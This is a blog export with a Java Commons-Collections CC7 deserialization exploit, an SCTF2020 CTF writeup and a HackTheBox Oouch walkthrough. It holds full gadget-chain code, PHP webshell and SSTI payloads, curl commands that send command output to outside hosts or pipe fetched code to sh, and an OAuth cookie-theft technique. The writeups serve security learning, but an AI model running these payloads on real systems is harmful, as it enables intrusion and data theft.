inputStream.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 同样也是cc依赖3,4通用。 然后强网杯当时一道java题记得就是用的cc6的链子改了下。因为当时是存在手写的黑名单，不能用hashmap,但是可以找替代的hashcode来利用。所以用HashBag替换一下就行。 12HashBag hashMap = new HashBag();hashMap.add(tiedMapEntry, 1); hashBag继承了一个抽象类,然后方法基本跟HashMap差不多。所以小改下就可以直接打了。 CommonsCollections7 cc7的链子是通过AbstractMap#equals来触发LazyMap#get 1234567891011121314151617181920212223242526272829303132public boolean equals(Object o) &#123; if (o == this) return true; if (!(o instanceof Map)) return false; Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o; if (m.size() != size()) return false; try &#123; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) &#123; Entry&lt;K,V&gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) &#123; if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false; &#125; else &#123; if (!value.equals(m.get(key))) return false; &#125; &#125; &#125; catch (ClassCastException unused) &#123; return false; &#125; catch (NullPointerException unused) &#123; return false; &#125; return true;&#125; 这里如果控制m为lazymap即可触发rce. 然后cc7是在HashTable#reconstitutionPut中调用过equals方法 1234567int hash = hash(key); int index = (hash &amp; 0x7FFFFFFF) % tab.length; for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; throw new java.io.StreamCorruptedException(); &#125; ...... 然后HashTable的readObject也调用过了reconstitutionPut.所以可以触发。 exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Hashtable;public class cc7 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(java.lang.Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[]&#123;&#125;&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;\"calc\"&#125;&#125;), &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap innerMap1 = new HashMap&lt;String, String&gt;(); innerMap1.put(\"yy\", \"1\"); // \"yy\".hashCode() == \"zZ\".hashCode() == 3872 HashMap innerMap2 = new HashMap&lt;String, String&gt;(); innerMap2.put(\"zZ\", \"1\"); LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer); LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer); HashMap hashMap = new HashMap(); hashMap.put(lazyMap1, \"placeholder\"); hashMap.put(lazyMap2, \"placeholder\"); innerMap1.remove(\"zZ\"); Field field = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); field.setAccessible(true); field.set(chainedTransformer, transformers); try &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"./out.bin\")); oos.writeObject(hashMap); oos.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./out.bin\")); inputStream.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 这里有个细节。就是首先需要put两次才能调用equals方法。然后由于一个小bug 1\"yy\".hashCode() == \"zZ\".hashCode() 会导致”碰撞”发生，其实就是因为这样计算出来的hash一致所以会导致它调用其中一个对象的equals方法进行比较。这样就能成功进入我们的gadget了。最后expremove掉zZ这第二个元素。这是要去掉这个键。否则这个hashmap会带上无法序列化的对象从而使反序列化失败。 summary 没想到最后还是成功把链子都跟完了。这篇文章就写这么多了。反序列化的gadget跟进说实话比起php少了一点变通，但是难度还是有点大的。不过整体下来不难发现Map类,cc库中的一系列Transformer类，反射的技巧起到了至关重要的作用。并且实际上肯定存在更多gadget等待发掘。 后面会抽空去学习下shiro,jackson,fastjson等等的深度分析。","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"}]},{"title":"SCTF2020 writeup","slug":"SCTF2020-writeup","date":"2020-07-05T12:33:28.000Z","updated":"2021-02-18T05:09:47.891Z","comments":true,"path":"2020/07/05/SCTF2020-writeup/","link":"","permalink":"https://www.bycsec.top/2020/07/05/SCTF2020-writeup/","excerpt":"越打越菜 :(这次比赛难度相比上次RCTF的难度好了点。但是最后还是只能感慨自己tcl。做出来的只有CloudDisk跟UnsafeDefenseSystem.相比下solve比较多的pythonsandbox自己反而因为总觉得pyjail太老套不去研究,连下手都做不到……赛后还是把能复现的都复现下吧。","text":"越打越菜 :(这次比赛难度相比上次RCTF的难度好了点。但是最后还是只能感慨自己tcl。做出来的只有CloudDisk跟UnsafeDefenseSystem.相比下solve比较多的pythonsandbox自己反而因为总觉得pyjail太老套不去研究,连下手都做不到……赛后还是把能复现的都复现下吧。 CloudDiskNodejs经典漏洞。其实因为最近练手出了些Nodejs的题目,现在感觉Node写起来巨舒服,估计暑假会长期练手一些node项目。 首先先不说题目本身,单从最近写nodejs应用express入手，发现express框架一个启用支持数据的写法： 1234const bodyParser = require('body-parser');app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;)); 这里是表示我们的应用支持application/json跟application/x-www-form-urlencoded传输的数据.相信在post包时见过不少次了。而让我注意到这个问题的起因是在一次CTF比赛中。本来那题是Nodejs反序列化作为考点，但是我开始在随意测试时发现了另一个漏洞，不过因为不是正确思路就没深入。后来getshell时把源码拿下来仔细阅读，发现问题就是出在这上面。对于Nodejs而言,传输json数据是非常危险的一件事。因为Nodejs本身就是js的一个runtime环境,javascript的对象写法就是{&quot;sth&quot;:&quot;byc&quot;}之类的。而json数据与这的格式一致性往往导致传输的数据会被进行混淆。一旦程序写法有了问题，就可能误取某个用户传输的值作为对象的属性，导致原型链污染，变量混淆，Nosql注入之类的。 回到题目。由于有源码,所以直接上手分析。当然由于Nodejs的特性，以及本题所执行的上传下载的过程,在依赖正常的情况下不可能出现注入，路径穿越之类的问题。只可能是文件读取了。那么问题出在哪呢 1234const file = ctx.request.body.files.file;const reader = fs.createReadStream(file.path);...const upStream = fs.createWriteStream(filePath); 注意这里,它的取值是从ctx.request.body中取的。而这就有可能出现上面提到的问题。假如我们传输json数据files并置其path属性为任意文件。我们之后下载的文件就是服务器上的文件了。 故读取之 1&#123;\"files\":&#123;\"file\":&#123;\"path\":\"/app/flag\"&#125;&#125;&#125; 后来根据队友教的应该是个koa-body的问题。难怪我本地当时连上传都跑不起来。因为是个2.x版本的koa.出题人不给package.json估计是怕一眼看出版本问题吧。 UnsafeDefenseSystem说真的。这题这次真的是心态起伏最大的一题。说实话我们本来有拿下一血的机会的。结果因为小细节就导致自己浪费了数个小时。第一天晚上9点左右我们就已经在打tp5.0.24的反序列化了。结果一直就以失败告终,第二天才终于明白问题不是出在exp上.具体后面再说吧。 老实说这题整体脉络下来跟我平时渗透的思路很相似，所以在前面进度非常顺利，没有卡壳。 第一步是访问网址。发现作了个跳转。同时提醒了log.txt的存在.(就是因为我看掉了log.txt导致后面浪费的巨量时间，该打) 因为跳转到/public/test。所以直接访问这个路由。得到一个网页。随便点点后似乎是静态的。这时候果断切ctrl+u看源码,并且ctrl+f搜索php。看有没有动态文件存在。果然在注释中找到了。 1&lt;!-- Admin:/public/nationalsb/login.php --&gt; 访问后发现是个auth的登录。但是任意用户密码都能进。不过毕竟我们收获了一个新路由/public/nationalsb/果断去这看看。 同样还是直接看网页源码,发现功能又是个静态的。但是有个js文件。点进去收获提示。 123/username:Admin1964752//password:DsaPPPP!@#amspe****//Secret **** is your birthday 显然密码后四位要爆破。随便写个脚本出后四位好了。这种爆破量相比之前hackthebox的量已经非常友好。 最后爆出密码后缀1221.登录时的内容提示我们可以postfile.实验后是个lfi.不过显然做了处理，不能读取/flag跟带有log的(这里我以为是ban了login,但后来发现是ban了log…).那么基于这是个tp5.0.24.果断dump源码好了 现场下了个tp5.0.24的源码。最重要的肯定是控制器源码。所以读取application/index/controller/Index.php 12345678&lt;?php ?&gt;#r=requests.get(un_url+tmp_unserialize_payload)r=requests.get(un_url+unserialize_payload)r=requests.post('http://39.99.41.124/public/3b58a9545013e88c7186db11bb158c44.php',data=&#123; 'ccc':\"system('cat /flag');\"&#125;)print(r.text) 最后再回过头解释下使用过滤器的原因吧。因为之前郁师傅实战中遇到了，所以有这两个坑点 short open tag1234&lt;?cuc&#x2F;&#x2F;000000000000 rkvg();?&gt;报错 Parse error: syntax error, unexpected &#39;rkvg&#39; (T_STRING) 因为默认支持短标签的原因，由于 &lt;?cuc，也就是 &lt;?后面出现了 cuc 字符串，使得代码语法不合格，php 报错退出执行。 因此,要素其实就是绕过这个exit()。要想&lt;,?不被识别。我们可以用string.strip_tags过滤器来解决。但是要让shell代码&lt;?php eval(xxx)不被过滤。我们可以用convert.base64-decode过滤器来解决。所以要素就是两种过滤器搭配。但是这里需要解决的最重要的问题，就是base64解释器遇到等号就直接结束了。所以还要想办法让文件名中不出现=. 这里就可以使用php默认支持的iconv过滤器。优势在于，我们可以直接使用iconv这个shell命令支持的所有编码进行转换。而之前我们在各种比赛中应该也接触过转码为utf-7的webshell了。比如XNUCA 12345678&lt;?php$cc&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;123.txt&#39;;file_put_contents($cc,&#39;&#x3D;&#39;);&#x2F;**123.txt 写入的内容为: +AD0-**&#x2F; +AD0-可以被base64过滤器解码,所以说我们就能成功写入shell了。 1php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g&#x2F;..&#x2F; 而且生成的文件名不会像rot13那样有奇怪的前缀。我们直接得到md5作为文件名的php。(值取决于你的file类中的$tag值,很多exp里就是true.所以算md5(‘tag_’+md5(‘1’))就行了) 当然因为base64是8byte解码。实际需要根据自己的payload补足a.当然最多补足4个就行。所以FUZZ下就能解决问题 所以说真的拉胯。还靠着郁师傅的老本以为占尽先机。却因为一些小细节走入误区。可能这就是渗透吧。 bestlanguage我要是审过laravel5.8RCE以外的链子会是这个吊样.jpg…..第五空间的laravel因为审过链子所以直接秒了。这个因为没审过看都没看懂,属实拉胯。 其实就是CVE-2018-15133.因为.env里给了key所以就能直接打。payload可以用第五空间的payload。因为以前在php框架练习中护网杯的非预期里提过这个链子了。所以就不深谈了。然后第五空间就是改了一个类的destruct。换了另一个类的destruct还能触发__get。这里可以用两个类都能用。 payload用ggc生成挺省事的。当然直接用之前rceexp的也可以 1O:40:&quot;Illuminate\\Broadcasting\\PendingBroadcast&quot;:2:&#123;s:9:&quot;*events&quot;;O:28:&quot;Illuminate\\Events\\Dispatcher&quot;:1:&#123;s:12:&quot;*listeners&quot;;a:1:&#123;s:28:&quot;curl 120.27.246.202&#x2F;&#96;whoami&#96;&quot;;a:1:&#123;i:0;s:6:&quot;system&quot;;&#125;&#125;&#125;s:8:&quot;*event&quot;;s:28:&quot;curl xxxxx&#x2F;&#96;cat &#x2F;flag&#96;&quot;;&#125; base64后联合key送给某cvephp即可。当然也能直接调用生成。其他战队大佬的wp写的肯定比我好。我就不放exp了。 看到预期解是通过覆盖session反序列化。这就能解释index的路由设置了。可惜了本来一个很难绕过的题都被大家利用框架的洞打成RCE了…… pysandbox 1&amp;2题目虽然是沙盒逃逸。但其实用的exp自己之前也用过.看官方wp用的当初tokyowestern的脚本倒是挺惊讶的。因为自己前不久做安恒比赛时也用过shrine那题的脚本。总之就是能直接fuzz出一条继承链，相当好用。 先来学习下dalao们的设置静态目录的做法 123&#x2F;?POST&#x3D;%2fcmd&#x3D;app.static_folder&#x3D;request.args[request.method] 设置静态目录为/之后即可访问static/flag 然后就是RCE了。这里其实自己之前FUZZ过一次。就是用shrine那个脚本fuzz出一条获取app的链。 当然这里看到一个很简单的方法。分享下W4nder师傅的http://phoebe233.cn/index.php/archives/53/#pysandbox2因为ord是在builtins里的。所以我们可以直接覆盖。之后同理再覆盖掉路由函数。利用lambda匿名函数。非常巧妙。 如果是官方的思路,跟我一开始的想法应该差不多。道理就是函数劫持。当然前提是能获取到可控变量的模块。出题人找的是werkzeug.urls.url_parse。这里我也用shrine当时的脚本来fuzz下。 search.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# search.pydef search(obj, max_depth): visited_clss = [] visited_objs = [] def visit(obj, path='obj', depth=0): yield path, obj if depth == max_depth: return elif isinstance(obj, (int, float, bool, str, bytes)): return elif isinstance(obj, type): if obj in visited_clss: return visited_clss.append(obj) print(obj) else: if obj in visited_objs: return visited_objs.append(obj) # attributes for name in dir(obj): if name.startswith('__') and name.endswith('__'): if name not in ('__globals__', '__class__', '__self__', '__weakref__', '__objclass__', '__module__'): continue attr = getattr(obj, name) yield from visit(attr, '&#123;&#125;.&#123;&#125;'.format(path, name), depth + 1) # dict values if hasattr(obj, 'items') and callable(obj.items): try: for k, v in obj.items(): yield from visit(v, '&#123;&#125;[&#123;&#125;]'.format(path, repr(k)), depth) except: pass # items elif isinstance(obj, (set, list, tuple, frozenset)): for i, v in enumerate(obj): yield from visit(v, '&#123;&#125;[&#123;&#125;]'.format(path, repr(i)), depth) yield from visit(obj) app.py 1234567891011121314151617181920import flaskimport osfrom flask import requestfrom search import searchapp = flask.Flask(__name__)@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): for path, obj in search(request, 10): if str(obj)==\"werkzeug.urls\": return pathif __name__ == '__main__': app.run(debug=True) 这里因为要获取到werkzeug.urls这个类。所以改成if str(obj)==&quot;werkzeug.urls&quot;然后再本地跑起这个flask.访问下/shrine/这个路由+随便什么。方便它获取到request。这样就能返回一条利用链。 1app.__class__._get_current_object.__globals__[&#39;ClosingIterator&#39;].close.__globals__[&#39;uri_to_iri&#39;].__globals__[&#39;__name__&#39;] 然后不能用引号当然只能是request.args绕过(跟上面一样)。使用request.host，request.headers之类的把要传的值放header里即可。劫持url_parse()获取函数eval()。然后后面url_parse因为直接处理路由。那就可以直接路由传命令RCE。__import__(&#39;os&#39;).system(&#39;curl$IFSxxxxx|sh&#39;) 题目其实不难，但是自己后来看都没看,跑去看asis了。 jsonhub题目因为web1是django的原因，导致自己第一步不熟悉而直接断掉思路。后面的ssrf与ssti反而还有经验,应该属于自己不熟悉django的问题吧。 题目开始的参数注入 1&#123;&quot;username&quot;:&quot;byc_401&quot;,&quot;password&quot;:&quot;123&quot;,&quot;is_staff&quot;:1,&quot;is_superuser&quot;:1&#125; 使用这两个字段应该是因为User模型的缘故。属于django默认的两个列名。后台登录后拿到token 接下来是源码中一个需要利用cve绕过的部分。 123456789101112white_list = [\"39.104.19.182\"]def ssrf_check(url ,white_list): for i in range(len(white_list)): if url.startswith(\"http://\" + white_list[i] + \"/\"): return Falsedef flask_rpc(request): if request.META['REMOTE_ADDR'] != \"127.0.0.1\": return JsonResponse(&#123;\"code\": -1, \"message\": \"Must 127.0.0.1\"&#125;) 因为在web2存在明显的ssti,我们想要达成ssti必须要在这往127.0.0.1跑在8000的flask打一发。但是如果我们利用CVE-2018-14574这个任意url跳转，即可ssrf. 1http://39.104.19.182//127%2e0.0.1:8000/rpc?methods=POST&amp;data=eyJudW0xIjoiIiwibnVtMiI6IiIsInN5bWJvbHMiOiJ7XHUwMDdiJzEnLl9fY2xhc3NfXy5tcm8oKVstMV0uX19zdWJjbGFzc2VzX18oKVs2NF0uX19pbml0X18uX19nbG9iYWxzX19bJ19fYnVpbHRpbnNfXyddWydldmFsJ10oXCJfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnY3VybCAxMjAuMjcuMjQ2LjIwMi9gL3JlYWRmbGFnYCAnKVwiKX1cdTAwN2QifQ== 后面打flask的payload主要是解决大括号的问题。因为它是通过get_json获取数据的,因此其实并不存在waf的问题。只要用unicode绕过即可。这点在Node.js跟php的json_decode()绕过时应该经常用到。 并且，由于web2获取的参数要求num1,2不能有小写字母。symbols必须能匹配到+\\-*/之一。这个payload也直接绕过了waf. 1&#123;\"num1\":\"\",\"num2\":\"\",\"symbols\":\"&#123;\\u007b [].__class__.__base__.__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](\\\"__import__('os').system('curl xxxx/`/readflag` ')\\\")&#125;\\u007d\"&#125; 还可以用num1={,symbols={PAYLOAD},num2=}来解决问题。至于flask获取到含catch_warnings模组进而获取到eval的方法也是老生常谈。FUZZ下就好了。 所以自己主要是因为django太过陌生,导致没能下手,跑去看asis了。剩下的难度其实还好。 小结暂时先把wp放这些吧。争取明天自己再多复现下json_hub。因为刚好把htb的travel做完了，算是了却心头一件事。应该能抽空做些复现学习了。 关于最近的比赛心里其实一直有点难受。战队已经开始换届了,web新一届的学弟还没上来，但是平时在打比赛的web手已经几乎就只有我跟zjy了。每次xctf打到一半总感觉形单影只,相比人少而言更多的是感慨自己tcl。每次都会遇到感觉自己怎么没早点学的知识。心里过意不去。 不过毕竟打比赛是学习的过程,每次比赛确实都能接触到新姿势以及反思下自己的不足。现在既然到暑假了，是时候好好系统学习下新知识：1.php: 一个是phpauditlabs争取每次都审一遍;然后laravel跟tp这样的框架过一下。其实wordpress也可以接触下，正好最近碰到了。2.hackthebox: 不用做那么急,现役靶机剩下没做的基本上都是hard及以上难度了。可以慢慢来。3.java: 几乎从零开始的java学习(我自己爬)4.python: django的认识学习5.Nodejs: 保持现状。多练手下Nodejs的开发 差不多就这样了。争取假期期间多更下文章总结知识。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"hackthebox-Oouch","slug":"hackthebox-Oouch","date":"2020-07-01T05:43:43.000Z","updated":"2021-02-18T05:09:20.996Z","comments":true,"path":"2020/07/01/hackthebox-Oouch/","link":"","permalink":"https://www.bycsec.top/2020/07/01/hackthebox-Oouch/","excerpt":"Oouch靶机的难度相比最近做完的两个hard machine Quick跟Forwardslash而言有过之而无不及。甚至于感觉可能接近到Insane难度了。从web界面下手时遇到很多不稳定的问题，而之后从user提权到root更是出现玄学问题，一模一样的的payload头一天失败第二天就成了。但是总归学到了不少新知识，所以赶紧总结下。","text":"Oouch靶机的难度相比最近做完的两个hard machine Quick跟Forwardslash而言有过之而无不及。甚至于感觉可能接近到Insane难度了。从web界面下手时遇到很多不稳定的问题，而之后从user提权到root更是出现玄学问题，一模一样的的payload头一天失败第二天就成了。但是总归学到了不少新知识，所以赶紧总结下。 靶机ip: 10.10.10.186 攻击机: 10.10.14.40 initial foothold to user nmap 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# Nmap 7.80 scan initiated Sun Jun 28 15:53:13 2020 as: nmap -sC -sV -oA nmap/oouch 10.10.10.177WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second valueNmap scan report for 10.10.10.177Host is up (0.43s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 ftp ftp 49 Feb 11 19:34 project.txt| ftp-syst: | STAT: | FTP server status:| Connected to 10.10.14.46| Logged in as ftp| TYPE: ASCII| Session bandwidth limit in byte/s is 30000| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)|_ 256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)5000/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2| http-title: Welcome to Oouch|_Requested resource was http://10.10.10.177:5000/login?next=%2F8000/tcp open rtsp| fingerprint-strings: | FourOhFourRequest, GetRequest, HTTPOptions: | HTTP/1.0 400 Bad Request| Content-Type: text/html| Vary: Authorization| &lt;h1&gt;Bad Request (400)&lt;/h1&gt;| RTSPRequest: | RTSP/1.0 400 Bad Request| Content-Type: text/html| Vary: Authorization| &lt;h1&gt;Bad Request (400)&lt;/h1&gt;| SIPOptions: | SIP/2.0 400 Bad Request| Content-Type: text/html| Vary: Authorization|_ &lt;h1&gt;Bad Request (400)&lt;/h1&gt;|_http-title: Site doesn't have a title (text/html).|_rtsp-methods: ERROR: Script execution failed (use -d to debug)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8000-TCP:V=7.80%I=7%D=6/28%Time=5EF84CE8%P=x86_64-pc-linux-gnu%r(GeSF:tRequest,64,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20texSF:t/html\\r\\nVary:\\x20Authorization\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(400\\)&lt;/SF:h1&gt;\")%r(FourOhFourRequest,64,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nConSF:tent-Type:\\x20text/html\\r\\nVary:\\x20Authorization\\r\\n\\r\\n&lt;h1&gt;Bad\\x20ReqSF:uest\\x20\\(400\\)&lt;/h1&gt;\")%r(HTTPOptions,64,\"HTTP/1\\.0\\x20400\\x20Bad\\x20ReqSF:uest\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20Authorization\\r\\n\\r\\n&lt;h1SF:&gt;Bad\\x20Request\\x20\\(400\\)&lt;/h1&gt;\")%r(RTSPRequest,64,\"RTSP/1\\.0\\x20400\\x2SF:0Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20AuthorizationSF:\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(400\\)&lt;/h1&gt;\")%r(SIPOptions,63,\"SIP/2\\.0\\SF:x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20AuthSF:orization\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(400\\)&lt;/h1&gt;\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Jun 28 15:55:59 2020 -- 1 IP address (1 host up) scanned in 166.01 seconds 21,22,5000,8000 端口开放。并且21端口ftp可以匿名登录。 ftp annoymous login ftp匿名登录捞下来一个project.txtget file project.txt 12Flask -&gt; ConsumerDjango -&gt; Authorization Server 按照nmap的结果，5000跟8000有两个web服务，看起来似乎是flask跟django. enumeration 此时从5000端口的服务入手。首先注册登录后发现提供了几个比较没用的功能，其中/document路由的内容提示只有admin能用。/profile显示我们可以链接账户，但是不知道要怎么做。/contact处似乎可以让admin接受我们的url然后造成ssrf.但是这些都还没有可具体下手的地方。 而8000端口的服务直接访问返回400.似乎到这一步就卡住了。 于是尝试爆破路由，有了意外的收获。 1wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u 'http://10.10.10.177:5000/FUZZ' --hc 404 -t 70 123456789101112131415161718192021********************************************************* Wfuzz 2.4.5 - The Web Fuzzer *********************************************************Target: http://10.10.10.177:5000/FUZZTotal requests: 4614===================================================================ID Response Lines Word Chars Payload ===================================================================000000223: 302 3 L 24 W 247 Ch \"about\"000000001: 302 3 L 24 W 237 Ch \"\" 000001013: 302 3 L 24 W 251 Ch \"contact\" 000001325: 302 3 L 24 W 255 Ch \"documents\" 000001908: 302 3 L 24 W 245 Ch \"home\" 000002347: 200 54 L 110 W 1828 Ch \"login\" 000002362: 302 3 L 24 W 219 Ch \"logout\" 000002722: 302 3 L 24 W 247 Ch \"oauth\" 000003160: 302 3 L 24 W 251 Ch \"profile\" 000003341: 200 63 L 124 W 2109 Ch \"register\" 除了之前几个功能外还有oauth。(这里是换了个平时不用的dirb词典爆出来的，虽然内容少但有时恰好就能得到想要的信息) 访问oauth 得到了5000端口与8000端口的具体域名。于是加到/etc/hosts中。 再接着尝试了两个链接后,我发现大概实现了一个authorize的过程。加上oauth的这个名词，我决定先去google一下，于是大致能够理解，这是一个实现了oauth2功能的场景。 oauth的流程是这样的 1.The application requests authorization to access service resources from the user. The application needs to provide the client ID, client secret, redirect URI and the required scopes.2.If the user authorizes the request, the application receives an authorization grant3.The application ** requests an access token from the authorization server ** by presenting authentication of its own identity, and the authorization grant4.If the application identity is authenticated and the authorization grant is valid, the authorization server issues the access and refresh (if required) token to the application. Authorization is complete.5.The application requests the resource from the resource server and presents the access token for authentication6.If the access token is valid, the resource server serves the resource to the application 按照阮一峰老师的理解，就是在客户端与服务商之间加上了一个授权层，这里具体而言，就是我们在授权后，可以让8000端口的账号跟5000的账号绑定在一起。每次进行操作时都会有这样的中间页面 根据consumer里oauth的要求。我们应该先去oauth/connect,然后当我们在authorization里注册完账号后，访问oauth/login就完成了账号的关联。 而这里就产生了一个提升权限的可能。oauth的特点在于，我们访问oauth/login进行账号关联时，中间层是根据我们之前connect时传输的token进行目标判定的(具体抓包了解)。那么如果我们以admin的身份传一个有效token，之后连接账号时就会把我们在authorization的账号与consumer处admin的账号相关联。这是每一次进行connect时,我们客户端会向发的一个含有token的包 这时之前提到的/contact就派上用场了。我们burp抓包并把这个传输token的包drop掉。转而利用admin的contact完成这次token发送。接下来再次点击oauth/login，就能触发连接,绑定admin账户。 现在我们已经绑定qtc账户了。并且在document处发现提示 一个账号。功能是application register 一个路由 /api/get_user 另外/oauth/authorize 支持get请求 似乎可以有途径可以得到sshkey 看来接下来要转战8000端口的authorization.oouch.htb了。首先作为普通用户，8000端口默认的两个路由都没有办法使用。那么现在先想办法用上我们之前得到的用户密码。 接着爆破 12wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;FUZZ --hc 404 -t 80wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;FUZZ --hc 404 -t 80 第一个无果。第二个发现存在/application也就是可以访问/oauth/application然而需要用户密码。我们之前的账户密码也不行。这时仔细过一遍document.发现说这个账户密码是有注册功能的，那就试试/oauth/application/register并输入账户密码 成功了，接下来我们就有了另一个有效的authorization app了。我设置的信息如下 1234567http://authorization.oouch.htb:8000/oauth/applications/2/clientid cHYVFErrrGQAm6Q1iWEfgT0hgf2KX4SIecLnNCKgclientsecret 1QWQrnwCzUIiU8tB4BywB3p9Ca8umJGaSzoxJraanOwv7duBX3UnZN4n1VYMzLOrnrXh7OzLNhHF7qPv1UufuY8fIkNLDoPDSaUC2JGqKVeKb9oJZJweVHeFCgku6kqzClient type publicAuthorization Grant Type client-credentialsredirect uri http://10.10.14.46/ 根据之前的ssrf，我们似乎有办法能够通过最后的一个uri完成xss的攻击。也就是打到admin的cookie。那么如何合法的构造一个url使得直接get访问就能重定向呢？这里就涉及到一些oauth的知识oauth-authorize 123456789101112131415161718#facebookGET https:&#x2F;&#x2F;api.instagram.com&#x2F;oauth&#x2F;authorize ?client_id&#x3D;&#123;app-id&#125;, &amp;redirect_uri&#x3D;&#123;redirect-uri&#125;, &amp;response_type&#x3D;code, &amp;scope&#x3D;&#123;scope&#125;#twitterPOST &#x2F;oauth2&#x2F;token HTTP&#x2F;1.1Host: api.twitter.comUser-Agent: My Twitter App v1.0.23Authorization: Basic eHZ6MWV2R ... o4OERSZHlPZw&#x3D;&#x3D;Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8Content-Length: 29Accept-Encoding: gzipgrant_type&#x3D;client_credentials 上面两个分别是facebook跟twitter的oauthapi的开发者文档里找的例子。虽然各家都有不同，但是大概的那几个参数也是能理解的。加上之前document里说oauth/authorize支持get请求，那么我们应该可以按照自己的app功能，构造一个恶意的url，重定向到我们自己这。先像self-xss一样往自己这打一发url的各个参数都要与之前注册的app的值完全一致。其中response_type为code是oauth标准固定的。 1http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;authorize&#x2F;?client_id&#x3D;cHYVFErrrGQAm6Q1iWEfgT0hgf2KX4SIecLnNCKg&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;10.10.14.46&#x2F;&amp;response_type&#x3D;code&amp;grant_type&#x3D;anthorization_code&amp;client_secret&#x3D;1QWQrnwCzUIiU8tB4BywB3p9Ca8umJGaSzoxJraanOwv7duBX3UnZN4n1VYMzLOrnrXh7OzLNhHF7qPv1UufuY8fIkNLDoPDSaUC2JGqKVeKb9oJZJweVHeFCgku6kqz 直接浏览器访问这个url,会进入到authorize的中间层。点下authorize就能在本机收到请求 那么直接利用之前的contact处ssrf即可完成cookie的盗取。 